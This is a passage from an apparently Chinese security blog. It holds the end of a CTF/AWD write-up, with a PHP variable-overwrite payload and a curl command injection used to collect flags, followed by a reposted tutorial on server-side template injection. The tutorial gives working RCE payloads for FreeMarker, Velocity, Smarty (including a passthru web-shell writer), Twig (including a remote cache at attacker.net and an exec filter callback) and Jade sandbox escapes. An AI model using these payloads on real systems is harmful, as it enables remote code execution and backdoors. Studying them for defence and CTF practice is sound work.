        <span class="token comment" spellcheck="true">//echo $hashed_input.'\n';</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hashed_input</span><span class="token operator">!==</span><span class="token variable">$hashed_key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//hashed_input=hashed_key时，得到flag。</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no way to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

        <span class="token comment" spellcheck="true">//发现是php的变量覆盖，覆盖action=auth，key=1，hashed_key=sha384的1</span>

    <span class="token punctuation">}</span>
        <span class="token delimiter">?></span>
</code></pre>
<p>利用php脚本来计算出hash中的sha384算法1的hash值，用来覆盖代码中的hash值。Hash值随便构造。以下为hash中的sha384算法1的hash值</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    
    str <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">'sha384'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">echo</span> str<span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token comment" spellcheck="true">//47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</span></code></pre>
<p><strong>payload</strong></p>
<pre><code>index.php?action=auth&amp;key=1&amp;hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</code></pre>
<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/2021/10/17/kun-peng-bei-2021/image-20211018153408081.png" alt="image-20211018153408081"></p>
<p><img src="/2021/10/17/kun-peng-bei-2021/image-20211018153419396.png" alt="image-20211018153419396"></p>
<pre><code>backend/views/site/fun.php?a=flag&amp;b=sec&amp;cmd=curl 10.120.115.10/index.php?token=108_USR-20211016-eelbz</code></pre>
<p>写脚本批量获取flag</p>
<pre><code>D:\AWD\鲲鹏杯校赛2021</code></pre>
]]></content>
  </entry>
  <entry>
    <title>Web:服务器模板注入攻击</title>
    <url>/2021/07/05/web-fu-wu-qi-mo-ban-zhu-ru-gong-ji/</url>
    <content><![CDATA[<p>原文：<a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h2><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki  中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。</p>
<h2 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a><strong>什么是服务端模板注入</strong></h2><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'custom_email'</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"first_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$user</span><span class="token punctuation">.</span>first_name<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求：</p>
<pre class=" language-text"><code class="language-text">custom_email={{7*7}} // GET 参数

49  // $output 结果</code></pre>
<p>还有更神奇的结果：</p>
<pre class=" language-text"><code class="language-text">custom_email={{self}} // GET 参数

Object of class
__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误</code></pre>
<p>我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
<p>为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p>
<h2 id="模板注入的手法"><a href="#模板注入的手法" class="headerlink" title="模板注入的手法"></a><strong>模板注入的手法</strong></h2><p>根据我的经验，我总结出如下步骤：</p>
<p><img src="https://pic4.zhimg.com/80/v2-b7184f6422f3b507a713a5843bb00723_720w.jpg" alt="img"></p>
<h2 id="1：探测漏洞"><a href="#1：探测漏洞" class="headerlink" title="1：探测漏洞"></a><strong>1：探测漏洞</strong></h2><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：</p>
<h2 id="文本类"><a href="#文本类" class="headerlink" title="文本类"></a><strong>文本类</strong></h2><p>大部分的模板语言支持我们输入 HTML，比如：</p>
<pre class=" language-smarty"><code class="language-smarty">smarty=Hello <span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token function">user</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token delimiter punctuation">}</span></span>
Hello user1

freemarker=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token function">username</span><span class="token delimiter punctuation">}</span></span>
Hello newuser

any=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></code></pre>
<p>未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。除此之外，模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p>
<pre class=" language-smarty"><code class="language-smarty">smarty=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token delimiter punctuation">}</span></span>
Hello 49

freemarker=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token delimiter punctuation">}</span></span>
Hello 49</code></pre>
<p>来确认漏洞。</p>
<h2 id="代码类"><a href="#代码类" class="headerlink" title="代码类"></a><strong>代码类</strong></h2><p>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p>
<pre class=" language-text"><code class="language-text">personal_greeting=username
Hello user01</code></pre>
<p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p>
<pre class=" language-text"><code class="language-text">personal_greeting=username<tag>
Hello
personal_greeting=username}}<tag>
Hello user01 <tag></code></pre>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>检测到模板注入后，我们需要判断具体的模板引擎。我们需要  fuzz 不同的字符，再通过返回的错误判断。当模板引擎屏蔽错误后，该类当法就失效了，并且暴力 fuzz 也对攻击自动化不友好。Burpsuite 则对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：</p>
<p><img src="https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_720w.jpg" alt="img"></p>
<p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><h2 id="读文档"><a href="#读文档" class="headerlink" title="读文档"></a><strong>读文档</strong></h2><p>读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：</p>
<ul>
<li>‘Template 使用手册’，这一部分通常告诉我们基本的模板语法</li>
<li>‘安全问题’，在攻击模板时，它通常可以提供我们许多思路</li>
<li>内建方法，函数，变量，过滤器</li>
<li>插件/扩展——我们可以优先研究默认开启的</li>
</ul>
<h2 id="探环境"><a href="#探环境" class="headerlink" title="探环境"></a><strong>探环境</strong></h2><p>当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数/对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。</p>
<p>如果没有这样的对象或函数，我们需要暴力枚举变量名。我已在 FuzzDB 和 Burp Intruder 中公布了 fuzz 字典。</p>
<p>有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。</p>
<h2 id="黑程序"><a href="#黑程序" class="headerlink" title="黑程序"></a><strong>黑程序</strong></h2><p>至此，读者已经了解如何利用这一攻击面了。但是我们需要提醒读者不要局限目光于通用特性，我们还需注意到不同开发者的实现细节。在余下的篇幅里，我会用模板注入来实现任意对象创建，任意文件读写，远程文件包含，信息泄露以及提权。</p>
<p>有些时候，攻破一个程序不需要多少时间，比如：{php}echo id;{/php}</p>
<p>这时，我们只需递交：</p>
<pre class=" language-jsp"><code class="language-jsp"><%
import os
x=os.popen('id').read()
%>
${x}</code></pre>
<p>即可</p>
<p>但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a><strong>案例</strong></h2><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a><strong>FreeMarker</strong></h2><p>FreeMaker 是 Java 下最受欢迎的模板引擎。喜出望外的是，这个模板的文档提到了安全问题：<br>Q:我可以允许用户递交模板吗？这又什么安全隐患吗？<br>A: 通常来讲，我们不允许这么做。除非用户是管理员或者可信任的用户。模板和 *.java 文件一样有威胁。如果你依然坚持这么做，那么你可以参考<a href="https://link.zhihu.com/?target=http://freemarker.org/docs/app_faq.html%23faq_template_uploading_security">这个</a></p>
<p>除了DoS等相对影响较小的问题，我们找到了个文献：<br>Configuration.setNewBuiltinClassResolver，Environment.setNewBuiltinClassResolve：它们在模板中可以这样调用：”com.example.SomeClass”? new()，虽然这两个函数对FTL库十分重要，但是不应该出现在一般的模板里。new 它会产生  TemplateModel，这个类有引起任意代码执行的隐患。</p>
<p>虽然这个描述并不详细，但是我们可以粗略得知new会导致安全问题，让我们来看看它的文档：</p>
<p>用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
<p>如果你想让用户上传模板，你应该看<a href="https://link.zhihu.com/?target=http://freemarker.org/docs/ref_builtins_expert.html%23ref_builtin_new">这里</a></p>
<p>TemplateModel 有什么神奇的东西呢？我们来看一看：</p>
<p><img src="https://pic2.zhimg.com/80/v2-23be041d36b1eba277b4303de9a5bc21_720w.jpg" alt="img"></p>
<p>Execute！这是不是一个可以执行代码的功能呢？为了验证 Execute，我们可以：</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Execute</span>
<span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModel</span>
<span class="token comment" spellcheck="true">/*
给予FreeMaker执行命令权限，并将输入内联到模板里
*/</span></code></pre>
<p>果然和我们预料的一样：</p>
<pre class=" language-smarty"><code class="language-smarty">&lt;#assign ex="freemarker.template.utility.Execute"?new()> $<span class="token smarty"><span class="token delimiter punctuation">{</span> <span class="token function">ex</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">}</span></span>
uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)</code></pre>
<p>这个 payload 会在后面大显身手。</p>
<h2 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a><strong>Velocity</strong></h2><p>Velocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和 <em>安全问题</em> 页面帮助我们构建 payload。下面展示了 Burp Intruder 在枚举变量名时的截图：（变量名在 payload 行，服务器结果在其右边）：</p>
<p><img src="https://pic4.zhimg.com/80/v2-eca8e9cbc67e9f08bccdb7caae3eefb7_720w.jpg" alt="img"></p>
<p>这幅图中，被高亮的 class 能返回对象，看上去十分有趣。谷歌一下，我们发现了<a href="https://link.zhihu.com/?target=https://velocity.apache.org/tools/releases/2.0/summary.html">如下描述</a>：<br>ClassTool：在模板中实现Java的反射，默认参数：$key</p>
<p>这里有几个可利用的方法和属性：<br>$class.inspect(class/object/string)：返回正在审查类或对象的ClassTool实例<br>$class.type：返回被审查的类</p>
<p>换句话说，我们可以通过这两个类获得任意对象信息。再利用目标的Runtime.exec()执行任意命令嗯。通过如下模板，我们可以验证这一点：</p>
<pre class=" language-jsp"><code class="language-jsp">$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒</code></pre>
<p>得到 shell 命令输出有点麻烦（毕竟java）：</p>
<pre class=" language-jsp"><code class="language-jsp">#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

//输出 tomcat7</code></pre>
<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a><strong>Smarty</strong></h2><p>Smarty 是一款 PHP  的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用  system()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置  $SCRIPT_NAME)。后面，我们又发现了 getStreamVariable:</p>
<p><img src="https://pic2.zhimg.com/80/v2-2d249e8cad5c5d0ed515abc5524b1051_720w.jpg" alt="img"></p>
<p>这个函数能任意读取有读写权限的文件：</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getStreamVariable</span><span class="token punctuation">(</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///proc/self/loginuid")}</span>
<span class="token number">1000</span>
<span class="token punctuation">{</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_NAME</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"SMARTY_DIR"</span><span class="token punctuation">,</span><span class="token string">'/usr/share/php/Smarty/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token constant">SMARTY_DIR</span><span class="token punctuation">.</span><span class="token string">'Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>不仅如此，我们能任意调用静态方法，这当中包括一个可以创建和重写文件的方法public  function writeFile($_filepath, $_contents, Smarty  $smarty)。通过该方法，我们能轻松在web目录下创建后门。值得注意的是，第三个参数必须为 Smarty 对象，所以我们要想办法得到  Smarty 对象的引用。</p>
<p>幸运的是，self::clearConfig帮助我们获取对象：</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> function <span class="token function">clearConfig</span><span class="token punctuation">(</span>$varname <span class="token operator">=</span> null<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">return</span> Smarty_Internal_Extension_Config<span class="token operator">:</span><span class="token operator">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token punctuation">,</span> $varname<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>最后，我们就可以创建后门了！</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span>Smarty_Internal_Write_File<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_NAME</span><span class="token punctuation">,</span><span class="token string">"&lt;?php passthru($_GET['cmd']); ?>"</span><span class="token punctuation">,</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>
<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a><strong>Twig</strong></h2><p>Twig 和 Smarty  类似，不过我们不能用它调用静态方法。幸运的是，它提供了 _self，我们并不需要暴力枚举变量名。虽然 _self 没什么有用的方法，它提供了指向 Twig_Environment 的env 属性。Twig_Environment 其中的 setCache 方法则能改变 Twig 加载  PHP 文件的路径。这样一来，我们就可以通过改变路径实现 RFI了：</p>
<pre class=" language-twig"><code class="language-twig"><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">setCache</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>ftp://attacker.net:2121<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">loadTemplate</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>backdoor<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span></code></pre>
<p>但是，PHP 默认禁止远程文件包含（关闭 allow_url_include），因此上述 payload 不能生效。进一步探索，我们在 getFilter  里发现了危险函数 call_user_func。通过传递传递参数到该函数中，我们可以调用任意 PHP 函数：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filterCallbacks</span> <span class="token keyword">as</span> <span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token variable">$callable</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filterCallbacks</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$callable</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>我们只需注册 exec 为 filter 的回调函数，并如此调用：</p>
<pre class=" language-twig"><code class="language-twig"><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">getFilter</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span>

<span class="token other">//返回结果： uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)</span></code></pre>
<h2 id="Twig（沙箱模式）"><a href="#Twig（沙箱模式）" class="headerlink" title="Twig（沙箱模式）"></a><strong>Twig（沙箱模式）</strong></h2><p>Twig 的沙箱模式有额外的限制。它会禁用一部分函数（包括开发者提供的对象），因此我们并不能调用有价值的东西。万幸的是，这部分代码帮助我们突破限制：</p>
<pre class=" language-twig"><code class="language-twig"><span class="token other">public function checkMethodAllowed($obj, $method)
{
  if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {
  return true;
}</span></code></pre>
<p>这里，我们可以调用实现 Twig_TemplateInterface 的对象，也就是说我们可以简介使用 _self.，_self.中的 displayBlock 让我们更上一层楼：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">displayBlock</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$blocks</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$useBlocks</span> <span class="token operator">=</span>
<span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$useBlocks</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!==</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token variable">$template</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$block</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token variable">$blocks</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Twig_Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre><code>我们可以用$template -&gt;$block($context,  $blocks)绕过白名单限制。以下的代码会调用 userObject 对象的  vulnerableMethod：{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}。虽然现在不能获得化境变量，但我们可以利用 _context 属性查找开发者自定义的对象并调用有用的目标。</code></pre>
<h2 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a><strong>Jade</strong></h2><p>Jade 是一款 Node.js 模板引擎。<a href="https://link.zhihu.com/?target=http://CodePen.io">http://CodePen.io</a> 则可以接受用户递交该模板。这里，我会展示如何对模板注入进行黑盒测试。</p>
<p>首先，让我们来确认模板可以执行代码：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">=</span><span class="token code"> <span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span></span>

<span class="token comment" spellcheck="true">//结果：49</span></code></pre>
<p>再来确认 self 对象的位置：ja</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">=</span><span class="token code"> root</span>

<span class="token comment" spellcheck="true">//结果：[object global]</span></code></pre>
<p>我们来列一下对象属性和函数：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray<span class="token punctuation">...</span> global, process, GLOBAL, root</code></pre>
<p>这些可能是可利用的函数：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

, title, version, moduleLoadList<span class="token punctuation">...</span> mainModule, setMaxListeners, emit, once</code></pre>
<p>绕过保护机制：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

因为安全原因，CodePen阻止了你的语句
请删除下列关键字后进行尝试
<span class="token punctuation">-</span><span class="token code"><span class="token operator">></span>process</span>
<span class="token punctuation">-</span><span class="token code"><span class="token operator">></span>mainModule</span>

<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

, id, exports, parent, filename, loaded, children, paths, load, require, _compile</code></pre>
<p>确定有用的函数：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>require</span>

